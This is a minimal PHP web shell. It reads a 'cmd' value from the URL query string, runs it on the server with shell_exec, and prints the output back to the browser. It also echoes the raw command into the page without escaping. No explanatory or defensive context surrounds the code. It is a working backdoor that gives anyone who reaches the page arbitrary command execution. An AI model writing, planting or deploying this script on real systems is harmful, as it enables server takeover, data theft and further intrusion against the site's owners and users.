<?php
	if (isset($_GET['cmd'])) {
		$cmd = $_GET['cmd'];
		echo "Executing\"<b>" . $cmd . "</b>\" ...<br>"; 
		echo '<pre>';
		$result = shell_exec($cmd);
		echo $result;
		echo '</pre>';
	}
	else {
		echo "No commands provided...please add \"<b>?cmd=</b>\" query string";
	}
?>	